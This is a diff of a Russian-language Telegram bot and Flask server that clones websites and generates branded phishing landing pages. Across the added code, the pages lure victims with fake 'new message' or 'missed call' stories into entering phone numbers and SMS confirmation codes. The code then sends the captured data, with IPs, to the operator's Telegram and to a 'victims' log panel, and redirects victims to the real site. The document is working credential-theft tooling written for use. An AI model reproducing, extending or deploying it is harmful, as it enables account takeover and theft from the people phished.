@@ -10,67 +10,62 @@ import time
 import json
 import re
 import hashlib
-import uuid
 from flask import Flask, request, render_template_string, jsonify
+import random
 
 # ========== КОНФИГ ==========
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
 ALLOWED_USERS = [ADMIN_ID]
 ACTIVE_TASKS = {}
-PHISH_SITES = {}  # {phish_id: {url, logs: [], created_at}}
+PHISH_SITES = {}
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# ========== ПАНЕЛЬ УПРАВЛЕНИЯ ==========
+# ========== ПАНЕЛЬ ЛОГОВ ==========
 PANEL_HTML = '''
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Панель управления</title>
+    <title>Панель | {{ domain }}</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
-        h1 { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; }
-        .log-entry { 
-            background: #111; 
-            border: 1px solid #333; 
-            padding: 10px; 
-            margin: 10px 0; 
-            border-radius: 5px;
-        }
-        .log-entry:hover { border-color: #00ff00; }
+        body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
+        h1 { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; font-size: 20px; }
+        .stats { display: flex; gap: 20px; margin-bottom: 20px; }
+        .stat { background: #111; padding: 15px; border-radius: 8px; text-align: center; flex: 1; }
+        .stat .num { font-size: 32px; color: #f00; }
+        .log { background: #111; border: 1px solid #333; padding: 10px; margin: 10px 0; border-radius: 5px; }
+        .log:hover { border-color: #0f0; }
         .key { color: #ff0; }
-        .val { color: #0ff; }
-        .time { color: #666; font-size: 12px; }
-        .count { color: #f00; font-size: 20px; }
-        .empty { color: #666; text-align: center; margin: 50px; }
+        .val { color: #0ff; word-break: break-all; }
+        .time { color: #666; font-size: 11px; margin-top: 5px; }
+        .empty { text-align: center; color: #666; padding: 50px; }
     </style>
-    <script>
-        // Автообновление каждые 5 секунд
-        setInterval(() => location.reload(), 5000);
-    </script>
+    <script>setInterval(()=>location.reload(),5000);</script>
 </head>
 <body>
-    <h1>🎣 Панель управления — {{ phish_url }}</h1>
-    <p>Фишинг-сайт: <a href="{{ phish_url }}" target="_blank">{{ phish_url }}</a></p>
-    <p class="count">Жертв: {{ logs|length }}</p>
-    <hr>
+    <h1>🎣 ПАНЕЛЬ | {{ domain }}</h1>
+    <div class="stats">
+        <div class="stat"><div class="num">{{ logs|length }}</div>жертв</div>
+        <div class="stat"><div class="num">{{ ips|length }}</div>уникальных IP</div>
+    </div>
     {% if logs %}
         {% for log in logs|reverse %}
-        <div class="log-entry">
-            {% for key, value in log.items() %}
-            <span class="key">{{ key }}:</span> 
-            <span class="val">{{ value }}</span><br>
+        <div class="log">
+            {% for k, v in log.items() %}
+            {% if k not in ['user_agent', 'referer'] %}
+            <span class="key">{{ k }}:</span> <span class="val">{{ v }}</span><br>
+            {% endif %}
             {% endfor %}
-            <span class="time">{{ log.get('time', '') }}</span>
+            <div class="time">{{ log.get('time', '') }} | IP: {{ log.get('ip', '?') }}</div>
         </div>
         {% endfor %}
     {% else %}
-        <div class="empty">Пока нет данных. Ждём жертв...</div>
+    <div class="empty">⏳ Ожидание жертв...</div>
     {% endif %}
 </body>
 </html>
@@ -78,461 +73,771 @@ PANEL_HTML = '''
 
 @app.route('/panel/<phish_id>')
 def view_panel(phish_id):
-    """Веб-панель логов"""
     phish = PHISH_SITES.get(phish_id)
     if not phish:
-        return "Фишинг-сайт не найден", 404
-    
+        return "Не найдено", 404
     return render_template_string(
-        PANEL_HTML, 
-        phish_url=phish['url'],
-        logs=phish.get('logs', [])
+        PANEL_HTML,
+        domain=phish.get('domain', '?'),
+        logs=phish.get('logs', []),
+        ips=list(set(l.get('ip','?') for l in phish.get('logs', [])))
     )
 
 @app.route('/submit/<phish_id>', methods=['POST'])
-def submit_phish(phish_id):
-    """Принимает данные с фишинг-страницы"""
+def submit_data(phish_id):
     phish = PHISH_SITES.get(phish_id)
     if not phish:
         return jsonify({'error': 'not found'}), 404
     
-    # Собираем все данные
-    data = {}
-    for key, value in request.form.items():
-        data[key] = value
-    
-    # Добавляем метаданные
+    data = {k: v for k, v in request.form.items()}
     data['ip'] = request.remote_addr
     data['user_agent'] = request.headers.get('User-Agent', '?')
-    data['referer'] = request.headers.get('Referer', 'direct')
     data['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
     
-    # Сохраняем
     phish.setdefault('logs', []).append(data)
     
-    # Сохраняем в файл
-    os.makedirs(f'/tmp/phish_logs/{phish_id}', exist_ok=True)
-    with open(f'/tmp/phish_logs/{phish_id}/logs.json', 'a') as f:
-        f.write(json.dumps(data, ensure_ascii=False) + '\n')
+    # Telegram
+    try:
+        text = f"🔥 НОВАЯ ЖЕРТВА | {phish.get('domain','?')}\n\n"
+        for k, v in data.items():
+            if k != 'user_agent':
+                text += f"<b>{k}</b>: <code>{v}</code>\n"
+        bot.send_message(ADMIN_ID, text, parse_mode='HTML')
+    except:
+        pass
     
-    # Отправляем в Telegram
-    log_text = "🔥 НОВАЯ ЖЕРТВА!\n\n"
-    for k, v in data.items():
-        log_text += f"<b>{k}</b>: <code>{v}</code>\n"
-    
-    bot.send_message(ADMIN_ID, log_text, parse_mode='HTML')
-    
-    # Редирект на оригинальный сайт
-    original_url = phish.get('original_url', 'https://google.com')
-    return f'<script>window.location.href="{original_url}";</script>'
+    redirect_url = phish.get('redirect', 'https://google.com')
+    return f'<script>window.location.href="{redirect_url}";</script>'
 
-# ========== ФИШИНГ-КЛОНЕР ==========
-class PhishCloner:
+# ========== БАЗОВЫЙ КЛОНЕР ==========
+class SiteCloner:
+    def __init__(self, target_url, task_id, chat_id):
+        self.target_url = target_url.rstrip('/')
+        self.task_id = task_id
+        self.chat_id = chat_id
+        self.output_dir = f"/tmp/clones/{task_id}"
+        self.domain = urlparse(target_url).netloc
+        self.assets = 0
+        
+        os.makedirs(self.output_dir, exist_ok=True)
+        for f in ['css', 'js', 'img', 'fonts']:
+            os.makedirs(f"{self.output_dir}/{f}", exist_ok=True)
+        
+        self.session = requests.Session()
+    
+    def download(self, url, folder):
+        try:
+            if not url or url.startswith(('data:', 'blob:', '#')):
+                return None
+            if not url.startswith('http'):
+                url = urljoin(self.target_url, url)
+            
+            name = os.path.basename(urlparse(url).path.split('?')[0])
+            if not name or len(name) < 3:
+                name = f"f_{hash(url)%10000}"
+            if '.' not in name:
+                name += '.css' if 'css' in url else '.js' if 'js' in url else '.png'
+            
+            path = f"{self.output_dir}/{folder}/{name}"
+            r = self.session.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=15)
+            if r.status_code == 200 and len(r.content) > 50:
+                with open(path, 'wb') as f:
+                    f.write(r.content)
+                self.assets += 1
+                return f"{folder}/{name}"
+        except:
+            pass
+        return None
+    
+    def clone(self):
+        bot.send_message(self.chat_id, f"🔄 Клонирую {self.domain}...")
+        
+        r = self.session.get(self.target_url, headers={
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
+        }, allow_redirects=True, timeout=20)
+        
+        if r.status_code != 200:
+            return None
+        
+        soup = BeautifulSoup(r.text, 'html.parser')
+        
+        # CSS
+        for t in soup.find_all('link', href=True):
+            if '.css' in t['href']:
+                l = self.download(t['href'], 'css')
+                if l: t['href'] = l
+        
+        # JS
+        for t in soup.find_all('script', src=True):
+            l = self.download(t['src'], 'js')
+            if l: t['src'] = l
+        
+        # IMG
+        for t in soup.find_all('img', src=True):
+            l = self.download(t['src'], 'img')
+            if l: t['src'] = l
+        
+        with open(f'{self.output_dir}/index.html', 'w', encoding='utf-8') as f:
+            f.write('<!DOCTYPE html>\n<html>\n<head>\n')
+            f.write('<meta charset="UTF-8">\n')
+            f.write('<meta name="viewport" content="width=device-width, initial-scale=1.0">\n')
+            f.write(f'<title>{self.domain}</title>\n')
+            for t in soup.find_all('link', href=True):
+                f.write(str(t) + '\n')
+            f.write('</head>\n<body>\n')
+            f.write(str(soup.find('body') or soup))
+            f.write('\n</body>\n</html>')
+        
+        return {'dir': self.output_dir, 'assets': self.assets}
+
+# ========== PHANTOM: ФИШИНГ-ЛЕНДИНГ С ИСТОРИЕЙ ==========
+class PhantomBuilder:
+    """Создаёт реалистичный фишинг на основе бренда сайта"""
+    
+    STORIES = {
+        'default': {
+            'title': 'Вам отправили сообщение',
+            'body': 'Пользователь хочет поделиться с вами файлом. Войдите, чтобы посмотреть.',
+            'button': 'Продолжить'
+        },
+        'messenger': {
+            'title': 'Новое сообщение',
+            'body': 'У вас непрочитанное сообщение от друга. Авторизуйтесь для просмотра.',
+            'button': 'Открыть'
+        },
+        'photo': {
+            'title': 'Кто-то поделился с вами фото',
+            'body': 'Войдите в аккаунт, чтобы посмотреть изображение.',
+            'button': 'Продолжить'
+        },
+        'voice': {
+            'title': 'Пропущенный звонок',
+            'body': 'У вас пропущенный голосовой вызов. Войдите чтобы прослушать.',
+            'button': 'Прослушать'
+        },
+        'video': {
+            'title': 'Видеосообщение',
+            'body': 'Вам отправили видеосообщение. Для просмотра необходимо войти.',
+            'button': 'Смотреть'
+        }
+    }
+    
     def __init__(self, target_url, task_id, chat_id):
         self.target_url = target_url.rstrip('/')
         self.task_id = task_id
         self.chat_id = chat_id
         self.phish_id = hashlib.md5(task_id.encode()).hexdigest()[:12]
-        self.output_dir = f"/tmp/phish/{self.phish_id}"
+        self.output_dir = f"/tmp/phantom/{self.phish_id}"
         self.domain = urlparse(target_url).netloc
         
         os.makedirs(self.output_dir, exist_ok=True)
-        for folder in ['css', 'js', 'images', 'fonts']:
-            os.makedirs(f"{self.output_dir}/{folder}", exist_ok=True)
+        os.makedirs(f"{self.output_dir}/assets", exist_ok=True)
         
         self.session = requests.Session()
-        self.assets_count = 0
     
-    def download_asset(self, url, folder):
-        """Скачивает ассет"""
+    def fetch_site_brand(self):
+        """Извлекает бренд с сайта"""
         try:
-            if not url or url.startswith(('data:', 'blob:', '#')):
-                return None
-            
-            if not url.startswith('http'):
-                url = urljoin(self.target_url, url)
-            
-            filename = os.path.basename(urlparse(url).path.split('?')[0])
-            if not filename or len(filename) < 3:
-                ext = '.css' if '.css' in url else '.js' if '.js' in url else '.png'
-                filename = f"asset_{hash(url) % 10000}{ext}"
-            
-            filepath = f"{self.output_dir}/{folder}/{filename}"
-            
-            resp = self.session.get(url, headers={
-                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
-                'Referer': self.target_url,
+            r = self.session.get(self.target_url, headers={
+                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'
             }, timeout=15)
             
-            if resp.status_code == 200 and len(resp.content) > 100:
-                with open(filepath, 'wb') as f:
-                    f.write(resp.content)
-                self.assets_count += 1
-                return f"/assets/{folder}/{filename}"
+            soup = BeautifulSoup(r.text, 'html.parser')
+            
+            # Ищем логотип
+            logo = None
+            for img in soup.find_all('img'):
+                if any(x in (img.get('src','')+img.get('alt','')).lower() 
+                      for x in ['logo', 'icon', 'brand']):
+                    logo = img.get('src')
+                    break
+            
+            if not logo:
+                # Берём первую картинку
+                first_img = soup.find('img')
+                logo = first_img.get('src') if first_img else None
+            
+            # Ищем название
+            title = soup.find('title')
+            brand_name = title.text.split('|')[0].split('–')[0].strip()[:30] if title else self.domain
+            
+            # Цвета
+            colors = {'bg': '#ffffff', 'primary': '#007aff', 'text': '#000000'}
+            for style in soup.find_all('style'):
+                if style.string:
+                    # Ищем цвет кнопок
+                    btn_colors = re.findall(r'#[0-9a-fA-F]{6}', style.string)
+                    if btn_colors:
+                        colors['primary'] = btn_colors[0]
+                    # Ищем фон
+                    bg = re.findall(r'background[^:]*:\s*(#[0-9a-fA-F]{6})', style.string)
+                    if bg:
+                        colors['bg'] = bg[0]
+            
+            return {
+                'brand': brand_name,
+                'logo': logo,
+                'colors': colors,
+                'domain': self.domain
+            }
         except:
-            pass
-        return None
+            return {
+                'brand': self.domain.upper(),
+                'logo': None,
+                'colors': {'bg': '#ffffff', 'primary': '#007aff', 'text': '#000000'},
+                'domain': self.domain
+            }
     
-    def create_phish(self):
-        """Клонирует сайт и превращает в фишинг"""
+    def build(self):
+        """Создаёт фишинг-лендинг"""
+        bot.send_message(self.chat_id, f"🎨 Создаю фишинг-лендинг для {self.domain}...")
         
-        bot.send_message(self.chat_id, f"🎣 Создаю фишинг-клон {self.domain}...")
+        brand = self.fetch_site_brand()
         
-        # Загружаем сайт
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
-            'Accept': 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'ru-RU,ru;q=0.9',
-        }
+        # Выбираем историю
+        domain_lower = self.domain.lower()
+        if any(x in domain_lower for x in ['max', 'vk', 'tg', 'telegram', 'whatsapp', 'viber']):
+            story = self.STORIES['photo']
+        elif any(x in domain_lower for x in ['call', 'phone', 'звон']):
+            story = self.STORIES['voice']
+        else:
+            story = self.STORIES['messenger']
         
-        resp = self.session.get(self.target_url, headers=headers, allow_redirects=True, timeout=20)
+        # Скачиваем логотип
+        local_logo = None
+        if brand['logo']:
+            try:
+                logo_url = urljoin(self.target_url, brand['logo'])
+                r = self.session.get(logo_url, timeout=10)
+                if r.status_code == 200:
+                    ext = os.path.splitext(urlparse(logo_url).path)[1] or '.png'
+                    with open(f"{self.output_dir}/assets/logo{ext}", 'wb') as f:
+                        f.write(r.content)
+                    local_logo = f"assets/logo{ext}"
+            except:
+                pass
         
-        if resp.status_code != 200:
-            bot.send_message(self.chat_id, f"❌ Ошибка: HTTP {resp.status_code}")
-            return None
+        # ===== СОЗДАЁМ HTML =====
+        html = f'''<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{brand['brand']}</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{
+            background: {brand['colors']['bg']};
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }}
+        .container {{
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+        }}
+        .logo {{
+            font-size: 24px;
+            font-weight: 700;
+            color: {brand['colors']['text']};
+            margin-bottom: 30px;
+            letter-spacing: -0.5px;
+        }}
+        .logo img {{
+            height: 40px;
+        }}
+        .card {{
+            background: #fff;
+            border-radius: 16px;
+            padding: 30px 20px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
+            margin-bottom: 20px;
+        }}
+        .icon {{
+            width: 60px;
+            height: 60px;
+            background: {brand['colors']['primary']};
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 28px;
+        }}
+        .story-title {{
+            font-size: 18px;
+            font-weight: 600;
+            color: {brand['colors']['text']};
+            margin-bottom: 10px;
+        }}
+        .story-body {{
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }}
+        .input-group {{
+            margin-bottom: 15px;
+            text-align: left;
+        }}
+        .input-group label {{
+            display: block;
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 5px;
+        }}
+        .input-group input {{
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+            background: #f8f8f8;
+        }}
+        .input-group input:focus {{
+            outline: none;
+            border-color: {brand['colors']['primary']};
+            background: #fff;
+        }}
+        .phone-prefix {{
+            display: flex;
+            gap: 8px;
+        }}
+        .phone-prefix select {{
+            padding: 14px 12px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #f8f8f8;
+            min-width: 80px;
+        }}
+        .phone-prefix input {{
+            flex: 1;
+        }}
+        .btn {{
+            width: 100%;
+            padding: 15px;
+            background: {brand['colors']['primary']};
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 5px;
+            transition: opacity 0.2s;
+        }}
+        .btn:hover {{ opacity: 0.9; }}
+        .btn:active {{ opacity: 0.7; }}
+        .footer {{
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.6;
+        }}
+        .footer a {{
+            color: {brand['colors']['primary']};
+            text-decoration: none;
+        }}
+        .error {{
+            background: #fff0f0;
+            color: #d00;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 15px;
+            text-align: center;
+            display: none;
+        }}
+        .loading {{
+            display: none;
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+            margin: 15px 0;
+        }}
+        .spinner {{
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ddd;
+            border-top-color: {brand['colors']['primary']};
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }}
+        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            {'<img src="' + local_logo + '" alt="' + brand["brand"] + '">' if local_logo else brand['brand']}
+        </div>
         
-        soup = BeautifulSoup(resp.text, 'html.parser')
-        
-        # Скачиваем CSS
-        bot.send_message(self.chat_id, "📥 Ресурсы...")
-        for tag in soup.find_all('link', href=True):
-            if '.css' in tag.get('href', ''):
-                local = self.download_asset(tag['href'], 'css')
-                if local: tag['href'] = local
-        
-        # Скачиваем JS
-        for tag in soup.find_all('script', src=True):
-            local = self.download_asset(tag['src'], 'js')
-            if local: tag['src'] = local
-        
-        # Скачиваем картинки
-        for tag in soup.find_all('img', src=True):
-            local = self.download_asset(tag['src'], 'images')
-            if local: tag['src'] = local
-        
-        # ===== ВАЖНО: ЗАМЕНА ФОРМ =====
-        form_count = 0
-        for form in soup.find_all('form'):
-            original_action = form.get('action', '')
-            form['action'] = f'/submit/{self.phish_id}'
-            form['method'] = 'POST'
+        <div class="card">
+            <div class="icon">📩</div>
+            <div class="story-title">{story['title']}</div>
+            <div class="story-body">{story['body']}</div>
             
-            # Добавляем скрытые поля для захвата доп. данных
-            hidden_input = soup.new_tag('input', type='hidden', name='original_action')
-            hidden_input['value'] = original_action
-            form.append(hidden_input)
+            <div class="error" id="error">Неверный номер или код</div>
             
-            form_count += 1
-        
-        # Если форм нет — добавляем свою форму захвата
-        if form_count == 0:
-            bot.send_message(self.chat_id, "⚠️ Форм не найдено. Добавляю свою...")
+            <form id="loginForm">
+                <div class="input-group">
+                    <label>Номер телефона</label>
+                    <div class="phone-prefix">
+                        <select name="country_code">
+                            <option value="+7">🇷🇺 +7</option>
+                            <option value="+375">🇧🇾 +375</option>
+                            <option value="+380">🇺🇦 +380</option>
+                            <option value="+998">🇺🇿 +998</option>
+                            <option value="+996">🇰🇬 +996</option>
+                        </select>
+                        <input type="tel" name="phone" placeholder="(999) 123-45-67" required autofocus>
+                    </div>
+                </div>
+                
+                <div class="input-group" id="codeGroup" style="display:none;">
+                    <label>Код подтверждения</label>
+                    <input type="text" name="code" placeholder="Введите код из SMS" maxlength="6" inputmode="numeric">
+                </div>
+                
+                <button type="submit" class="btn" id="submitBtn">{story['button']}</button>
+            </form>
             
-            # Ищем кнопки/ссылки входа
-            login_buttons = soup.find_all(['a', 'button'], string=re.compile(r'вход|войти|логин|sign.?in', re.I))
+            <div class="loading" id="loading">
+                <div class="spinner"></div> Проверка...
+            </div>
+        </div>
+        
+        <div class="footer">
+            Нажимая кнопку, вы соглашаетесь с<br>
+            <a href="#">условиями использования</a> и 
+            <a href="#">политикой конфиденциальности</a>.
+        </div>
+    </div>
+    
+    <script>
+        const form = document.getElementById('loginForm');
+        const phoneInput = form.querySelector('[name="phone"]');
+        const codeGroup = document.getElementById('codeGroup');
+        const codeInput = form.querySelector('[name="code"]');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorDiv = document.getElementById('error');
+        const loading = document.getElementById('loading');
+        
+        let step = 1;
+        
+        // Маска телефона
+        phoneInput.addEventListener('input', (e) => {{
+            let val = e.target.value.replace(/[^0-9]/g, '');
+            if (val.length > 10) val = val.slice(0, 10);
+            if (val.length > 0) {{
+                val = '(' + val.slice(0,3) + ') ' + val.slice(3,6) + '-' + val.slice(6,10);
+            }}
+            e.target.value = val;
+        }});
+        
+        form.addEventListener('submit', async (e) => {{
+            e.preventDefault();
             
-            for btn in login_buttons:
-                # Оборачиваем в форму
-                form = soup.new_tag('form', action=f'/submit/{self.phish_id}', method='POST')
-                form['style'] = 'display:inline;'
+            if (step === 1) {{
+                const phone = phoneInput.value.replace(/[^0-9]/g, '');
+                if (phone.length < 10) {{
+                    showError('Введите полный номер телефона');
+                    return;
+                }}
                 
-                # Добавляем поля
-                phone_input = soup.new_tag('input', type='text', name='phone', placeholder='Номер телефона')
-                phone_input['style'] = 'padding: 10px; margin: 5px; width: 100%; border: 1px solid #ccc; border-radius: 5px;'
+                // Отправляем номер
+                await sendData({{phone: phone, step: 1}});
                 
-                submit_btn = soup.new_tag('button', type='submit')
-                submit_btn.string = btn.get_text() or 'Войти'
-                submit_btn['style'] = 'padding: 10px 20px; background: #007aff; color: white; border: none; border-radius: 5px; cursor: pointer; width: 100%;'
+                // Показываем поле кода
+                codeGroup.style.display = 'block';
+                submitBtn.textContent = 'Подтвердить';
+                codeInput.focus();
+                step = 2;
+            }} else {{
+                const code = codeInput.value.trim();
+                if (code.length < 4) {{
+                    showError('Введите код полностью');
+                    return;
+                }}
                 
-                form.append(phone_input)
-                form.append(soup.new_tag('br'))
-                form.append(submit_btn)
+                // Отправляем код
+                await sendData({{
+                    phone: phoneInput.value.replace(/[^0-9]/g, ''),
+                    code: code,
+                    step: 2
+                }});
                 
-                btn.replace_with(form)
-                form_count += 1
+                // Показываем загрузку
+                loading.style.display = 'block';
+                submitBtn.disabled = true;
+                
+                // Редирект через 3 секунды
+                setTimeout(() => {{
+                    window.location.href = '{self.target_url}';
+                }}, 3000);
+            }}
+        }});
         
-        bot.send_message(self.chat_id, f"✅ Форм заменено: {form_count}")
+        async function sendData(data) {{
+            try {{
+                await fetch('/submit/{self.phish_id}', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
+                    body: new URLSearchParams(data)
+                }});
+            }} catch(e) {{}}
+        }}
         
-        # Создаём папку assets
-        os.makedirs(f"{self.output_dir}/assets/css", exist_ok=True)
-        os.makedirs(f"{self.output_dir}/assets/js", exist_ok=True)
-        os.makedirs(f"{self.output_dir}/assets/images", exist_ok=True)
+        function showError(msg) {{
+            errorDiv.textContent = msg;
+            errorDiv.style.display = 'block';
+            setTimeout(() => errorDiv.style.display = 'none', 3000);
+        }}
+    </script>
+</body>
+</html>'''
         
-        # Переносим файлы в правильные папки
-        for folder in ['css', 'js', 'images']:
-            src = f"{self.output_dir}/{folder}"
-            dst = f"{self.output_dir}/assets/{folder}"
-            if os.path.exists(src):
-                for f in os.listdir(src):
-                    shutil.move(f"{src}/{f}", f"{dst}/{f}")
-        
-        # Сохраняем HTML
         with open(f'{self.output_dir}/index.html', 'w', encoding='utf-8') as f:
-            f.write('<!DOCTYPE html>\n')
-            f.write('<html>\n<head>\n')
-            f.write('<meta charset="UTF-8">\n')
-            f.write('<meta name="viewport" content="width=device-width, initial-scale=1.0">\n')
-            f.write(f'<title>{self.domain}</title>\n')
-            
-            # CSS первым
-            for tag in soup.find_all('link', href=True):
-                f.write(str(tag) + '\n')
-            
-            f.write('</head>\n<body>\n')
-            body_content = soup.find('body')
-            if body_content:
-                f.write(str(body_content))
-            else:
-                f.write(str(soup))
-            f.write('\n</body>\n</html>')
+            f.write(html)
         
-        # Сохраняем в PHISH_SITES
+        # Регистрируем
         PHISH_SITES[self.phish_id] = {
             'url': self.target_url,
-            'original_url': self.target_url,
+            'domain': self.domain,
+            'redirect': self.target_url,
             'logs': [],
-            'created_at': time.time(),
-            'form_count': form_count
+            'type': 'phantom'
         }
         
         return {
             'phish_id': self.phish_id,
-            'form_count': form_count,
-            'assets': self.assets_count,
+            'brand': brand,
             'dir': self.output_dir
         }
 
-# ========== КОМАНДЫ БОТА ==========
-
+# ========== КОМАНДЫ ==========
 @bot.message_handler(commands=['start'])
 def start(message):
     if message.from_user.id not in ALLOWED_USERS:
-        bot.reply_to(message, "⛔ Доступ запрещён")
         return
     
     bot.reply_to(message, """
-🎣 ФИШИНГ-КЛОНЕР v4.0
+🚀 БОТ v5.0
 
-Команды:
-/phish URL — клонировать сайт и сделать фишинг
-/panel ID — ссылка на панель логов
-/logs ID — последние жертвы
-/list — все фишинг-сайты
-
-Пример:
-/phish https://web.max.ru
+📥 /clone URL — точная копия сайта
+🎣 /phish URL — копия + автоформы
+👻 /phantom URL — фишинг-лендинг с историей
+📊 /panel ID — веб-панель логов
+📋 /list — список сайтов
+💾 /get ID — скачать ZIP
 """)
 
-@bot.message_handler(commands=['phish'])
-def phish_site(message):
-    if message.from_user.id not in ALLOWED_USERS:
-        return
+@bot.message_handler(commands=['clone'])
+def clone_cmd(message):
+    if message.from_user.id not in ALLOWED_USERS: return
     
     args = message.text.split()
     if len(args) < 2:
-        bot.reply_to(message, "❌ /phish https://site.com")
+        bot.reply_to(message, "❌ /clone https://site.com")
         return
     
     url = args[1]
     if not url.startswith('http'):
         url = 'https://' + url
     
-    task_id = str(int(time.time()))[-8:]
-    ACTIVE_TASKS[task_id] = {
-        'url': url,
-        'status': 'phishing',
-        'chat_id': message.chat.id,
-        'type': 'phish'
-    }
+    tid = str(int(time.time()))[-8:]
+    ACTIVE_TASKS[tid] = {'url': url, 'status': 'cloning', 'chat_id': message.chat.id, 'type': 'clone'}
     
-    msg = bot.reply_to(message, f"🎣 Создаю фишинг...\n🎯 {url}")
+    msg = bot.reply_to(message, f"📥 Клонирую {url}...")
     
     def process():
-        cloner = PhishCloner(url, task_id, message.chat.id)
-        result = cloner.create_phish()
+        cloner = SiteCloner(url, tid, message.chat.id)
+        result = cloner.clone()
         
         if result:
-            phish_id = result['phish_id']
-            
-            # Ссылка на фишинг-сайт
+            zip_path = f"/tmp/clones/{tid}.zip"
+            shutil.make_archive(f"/tmp/clones/{tid}", 'zip', result['dir'])
+            ACTIVE_TASKS[tid].update({'status': 'done', 'file': zip_path})
+            bot.edit_message_text(
+                f"✅ Клон готов!\n📎 Ресурсов: {result['assets']}\n💾 /get {tid}",
+                message.chat.id, msg.message_id
+            )
+        else:
+            bot.edit_message_text("❌ Ошибка", message.chat.id, msg.message_id)
+    
+    threading.Thread(target=process).start()
+
+@bot.message_handler(commands=['phantom'])
+def phantom_cmd(message):
+    if message.from_user.id not in ALLOWED_USERS: return
+    
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ /phantom https://site.com")
+        return
+    
+    url = args[1]
+    if not url.startswith('http'):
+        url = 'https://' + url
+    
+    tid = str(int(time.time()))[-8:]
+    ACTIVE_TASKS[tid] = {'url': url, 'status': 'building', 'chat_id': message.chat.id, 'type': 'phantom'}
+    
+    msg = bot.reply_to(message, f"👻 Создаю фишинг-лендинг...\n🎯 {url}")
+    
+    def process():
+        builder = PhantomBuilder(url, tid, message.chat.id)
+        result = builder.build()
+        
+        if result:
             server_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN', request.host_url.rstrip('/'))
-            phish_url = f"{server_url}/phish/{phish_id}"
-            panel_url = f"{server_url}/panel/{phish_id}"
+            phish_url = f"{server_url}/phantom/{result['phish_id']}"
+            panel_url = f"{server_url}/panel/{result['phish_id']}"
             
-            # Архив для скачивания
-            zip_path = f"/tmp/phish/{phish_id}.zip"
-            shutil.make_archive(f"/tmp/phish/{phish_id}", 'zip', result['dir'])
+            zip_path = f"/tmp/phantom/{result['phish_id']}.zip"
+            shutil.make_archive(f"/tmp/phantom/{result['phish_id']}", 'zip', result['dir'])
             
-            ACTIVE_TASKS[task_id]['status'] = 'done'
-            ACTIVE_TASKS[task_id]['phish_id'] = phish_id
-            ACTIVE_TASKS[task_id]['file'] = zip_path
-            ACTIVE_TASKS[task_id]['panel_url'] = panel_url
-            ACTIVE_TASKS[task_id]['phish_url'] = phish_url
+            ACTIVE_TASKS[tid].update({
+                'status': 'done',
+                'phish_id': result['phish_id'],
+                'file': zip_path,
+                'panel_url': panel_url
+            })
             
             text = f"""
-✅ ФИШИНГ ГОТОВ!
+✅ ФИШИНГ-ЛЕНДИНГ ГОТОВ!
 
-🔑 ID: <code>{phish_id}</code>
-🎯 Оригинал: {url}
-📊 Форм: {result['form_count']}
-📎 Ресурсов: {result['assets']}
+🔑 ID: <code>{result['phish_id']}</code>
+🎯 Сайт: {url}
 
-🎣 ФИШИНГ-ССЫЛКА:
+👻 ССЫЛКА ДЛЯ ЖЕРТВЫ:
 <code>{phish_url}</code>
 
 📊 ПАНЕЛЬ ЛОГОВ:
 <code>{panel_url}</code>
 
 Команды:
-/panel {phish_id} — панель логов
-/logs {phish_id} — логи в Telegram
-/get {task_id} — скачать ZIP
+📊 /panel {result['phish_id']}
+📋 /logs {result['phish_id']}
+💾 /get {tid}
 """
             bot.edit_message_text(text, message.chat.id, msg.message_id, parse_mode='HTML')
         else:
